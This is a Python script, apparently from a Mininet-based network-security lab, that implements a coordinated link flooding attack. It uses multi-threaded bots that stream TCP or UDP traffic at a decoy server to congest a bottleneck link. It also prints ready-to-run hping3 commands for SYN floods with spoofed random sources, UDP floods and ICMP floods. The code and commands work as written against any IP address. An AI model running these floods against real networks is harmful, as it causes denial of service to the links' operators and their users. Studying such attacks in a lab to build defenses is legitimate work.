#!/usr/bin/env python3
"""
=============================================================================
ATTACK A: Traditional Link Flooding Attack (LFA)
=============================================================================
Classic LFA: coordinated low-rate flooding to congest bottleneck links
via legitimate-looking flows through decoy servers.

Method:
  1. Select decoy servers (publicly reachable hosts)
  2. Launch coordinated low-rate TCP/UDP flows toward decoys
  3. Traffic routes through bottleneck links → congestion
  4. Legitimate traffic on bottleneck link is starved

Key characteristics:
  - Low rate per source (evades per-flow rate detection)
  - Legitimate destination (decoy servers on target path)
  - Coordinated from multiple sources
  - Flows persist for long duration

Usage (inside Mininet):
    mininet> h1 python3 attacks/traditional_lfa.py --decoy 10.2.0.2 \
                --num-bots 5 --duration 120 --rate 1M &
    mininet> h2 python3 attacks/traditional_lfa.py --decoy 10.2.0.2 \
                --num-bots 5 --duration 120 --rate 1M &
    # ... repeat for h3..h8

hping3 equivalent commands (run from each host):
    # TCP SYN flood at 100pps toward decoy:
    hping3 -S -p 80 --flood --rand-source 10.2.0.2
    # Low-rate version (1000 packets, 10ms interval):
    hping3 -S -p 80 -i u10000 -c 10000 10.2.0.2
=============================================================================
"""

import time
import socket
import struct
import random
import threading
import argparse
import subprocess
import logging
import sys
from dataclasses import dataclass, field
from typing import List

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [LFA-TRAD] %(message)s'
)
LOG = logging.getLogger('TraditionalLFA')


@dataclass
class AttackConfig:
    """Configuration for the traditional LFA attack."""
    decoy_ip     : str   = '10.2.0.2'   # Decoy server IP (on bottleneck path)
    decoy_port   : int   = 80            # Decoy port (HTTP)
    num_bots     : int   = 8             # Number of simulated bots
    duration     : int   = 120           # Attack duration in seconds
    rate_pps     : int   = 500           # Packets per second per bot
    packet_size  : int   = 512           # Payload size in bytes
    use_tcp      : bool  = True          # TCP (True) or UDP (False)
    src_ips      : List[str] = field(default_factory=list)  # Bot IPs


class TraditionalLFABot:
    """
    Simulates a single LFA bot generating low-rate flooding traffic
    toward a decoy server to congest the bottleneck link.
    """

    def __init__(self, bot_id: int, config: AttackConfig):
        self.bot_id  = bot_id
        self.config  = config
        self.running = False
        self.packets_sent = 0
        self.bytes_sent   = 0

    def _send_tcp_flow(self):
        """Send persistent TCP connection with steady data stream."""
        payload = random.randbytes(self.config.packet_size)
        interval = 1.0 / self.config.rate_pps

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.config.decoy_ip, self.config.decoy_port))
            LOG.info('[Bot-%02d] TCP connected to %s:%d',
                     self.bot_id, self.config.decoy_ip, self.config.decoy_port)

            start = time.time()
            while self.running and (time.time() - start) < self.config.duration:
                try:
                    sock.send(payload)
                    self.packets_sent += 1
                    self.bytes_sent   += len(payload)
                    time.sleep(interval)
                except (socket.error, BrokenPipeError):
                    break
            sock.close()
        except (socket.error, socket.timeout, ConnectionRefusedError) as e:
            # In lab environment, decoy may not have server running.
            # Fall back to UDP to still generate traffic on the link.
            LOG.debug('[Bot-%02d] TCP failed (%s), falling back to UDP', self.bot_id, e)
            self._send_udp_flow()

    def _send_udp_flow(self):
        """Send UDP datagram stream toward decoy server."""
        payload  = random.randbytes(self.config.packet_size)
        interval = 1.0 / self.config.rate_pps

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        start = time.time()
        while self.running and (time.time() - start) < self.config.duration:
            try:
                sock.sendto(payload, (self.config.decoy_ip, self.config.decoy_port))
                self.packets_sent += 1
                self.bytes_sent   += len(payload)
                time.sleep(interval)
            except socket.error:
                time.sleep(0.1)
        sock.close()

    def run(self):
        """Start the bot attack."""
        self.running = True
        # Slight randomization in start time (0-2s jitter)
        time.sleep(random.uniform(0, 2.0))
        LOG.info('[Bot-%02d] Starting attack → %s (pps=%d)',
                 self.bot_id, self.config.decoy_ip, self.config.rate_pps)

        if self.config.use_tcp:
            self._send_tcp_flow()
        else:
            self._send_udp_flow()

        LOG.info('[Bot-%02d] Finished: %d pkts, %d KB',
                 self.bot_id, self.packets_sent, self.bytes_sent // 1024)

    def stop(self):
        self.running = False


class TraditionalLFA:
    """
    Orchestrates multiple bots for coordinated link flooding.
    """

    def __init__(self, config: AttackConfig):
        self.config = config
        self.bots   = [TraditionalLFABot(i, config) for i in range(config.num_bots)]
        self.threads= []

    def run(self):
        LOG.info('=' * 60)
        LOG.info('Traditional LFA Attack')
        LOG.info('  Decoy target : %s:%d', self.config.decoy_ip, self.config.decoy_port)
        LOG.info('  Bots         : %d', self.config.num_bots)
        LOG.info('  Duration     : %ds', self.config.duration)
        LOG.info('  Rate/bot     : %d pps', self.config.rate_pps)
        LOG.info('  Protocol     : %s', 'TCP' if self.config.use_tcp else 'UDP')
        LOG.info('  Expected bw  : ~%.1f Mbps (total)',
                 self.config.num_bots * self.config.rate_pps *
                 self.config.packet_size * 8 / 1e6)
        LOG.info('=' * 60)

        # Launch all bots in threads
        for bot in self.bots:
            t = threading.Thread(target=bot.run, daemon=True)
            self.threads.append(t)
            t.start()

        # Wait for attack duration
        try:
            time.sleep(self.config.duration + 5)
        except KeyboardInterrupt:
            LOG.info('Attack interrupted by user')

        self.stop()

    def stop(self):
        LOG.info('Stopping all bots...')
        for bot in self.bots:
            bot.stop()
        for t in self.threads:
            t.join(timeout=3)
        total_pkts  = sum(b.packets_sent for b in self.bots)
        total_bytes = sum(b.bytes_sent for b in self.bots)
        LOG.info('Attack complete: %d total packets, %.1f MB',
                 total_pkts, total_bytes / 1e6)


# =============================================================================
# hping3 Command Generator
# =============================================================================
def print_hping3_commands(config: AttackConfig):
    """Print equivalent hping3 commands for manual execution."""
    print('\n' + '=' * 60)
    print('  EQUIVALENT hping3 COMMANDS (for manual testing)')
    print('=' * 60)
    print()
    print(f'# Run from each attack host (h1..h{config.num_bots}):')
    print()
    print(f'# 1. High-rate TCP SYN flood (maximum):')
    print(f'   hping3 -S -p {config.decoy_port} --flood {config.decoy_ip}')
    print()
    print(f'# 2. Low-rate TCP flood (stealth, 100pps):')
    print(f'   hping3 -S -p {config.decoy_port} -i u10000 '
          f'-c {config.duration * 100} {config.decoy_ip}')
    print()
    print(f'# 3. UDP flood:')
    print(f'   hping3 --udp -p {config.decoy_port} -i u2000 '
          f'-c {config.duration * 500} {config.decoy_ip}')
    print()
    print(f'# 4. ICMP flood:')
    print(f'   hping3 --icmp -i u1000 -c {config.duration * 1000} {config.decoy_ip}')
    print()
    print(f'# 5. Random source IP (distributed flood):')
    print(f'   hping3 -S -p {config.decoy_port} --rand-source '
          f'-i u5000 {config.decoy_ip}')
    print()
    print(f'# Monitor bottleneck link utilization (on switch):')
    print(f'   watch -n1 "ovs-ofctl dump-ports s1 | grep -A3 port"')
    print()


# =============================================================================
# Main
# =============================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Traditional LFA Attack')
    parser.add_argument('--decoy',    default='10.2.0.2', help='Decoy server IP')
    parser.add_argument('--port',     type=int, default=80, help='Decoy port')
    parser.add_argument('--num-bots', type=int, default=8,  help='Number of bots')
    parser.add_argument('--duration', type=int, default=120, help='Duration (s)')
    parser.add_argument('--rate',     type=int, default=500, help='Packets/sec/bot')
    parser.add_argument('--pkt-size', type=int, default=512, help='Payload bytes')
    parser.add_argument('--udp',      action='store_true',   help='Use UDP instead of TCP')
    parser.add_argument('--show-commands', action='store_true', help='Print hping3 cmds')
    args = parser.parse_args()

    config = AttackConfig(
        decoy_ip   = args.decoy,
        decoy_port = args.port,
        num_bots   = args.num_bots,
        duration   = args.duration,
        rate_pps   = args.rate,
        packet_size= args.pkt_size,
        use_tcp    = not args.udp
    )

    if args.show_commands:
        print_hping3_commands(config)
        sys.exit(0)

    attack = TraditionalLFA(config)
    attack.run()
